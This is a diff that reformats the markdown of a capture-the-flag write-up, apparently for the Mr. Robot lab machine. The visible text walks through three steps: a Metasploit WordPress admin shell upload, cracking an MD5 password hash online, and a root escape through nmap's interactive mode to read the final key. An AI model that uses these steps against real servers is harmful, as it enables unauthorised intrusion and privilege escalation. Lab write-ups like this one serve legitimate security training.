@@ -102,12 +102,14 @@ Upon exploring, it appears that the WordPress installation is inactive. There ar
 Our next step is to utilize the WordPress admin privileges to gain access to the webserver. To achieve this, we'll employ Metasploit.
 
 Use :-
-``bash
+```bash
 msfconsole
 ```
-``bash
+
+```bash
 search wordpress shell
 ```
+
 ``` bash
 exploit/unix/webapp/wp_admin_shell_upload or use 1
 ```
@@ -164,7 +166,7 @@ If we now go to the user’s desktop at /home/robot, we can see the second key t
 
 
 Now we got the hash from the raw-md5 file for the account “robot”. 
-# Robot:c3fcd3d76192e4007dfb496cca67e13b
+## Robot:c3fcd3d76192e4007dfb496cca67e13b
 
 The md5 hash can be cracked by hashcat but since its is been hashed we can check it online on Crackstation.
 
@@ -188,8 +190,10 @@ nmap –interactive
 ```bash
 !whoami
 ```
+
 ```bash !ls /root
 ```
+
 ```bash
 !cat /root/key-3-of-3.txt'
 ```
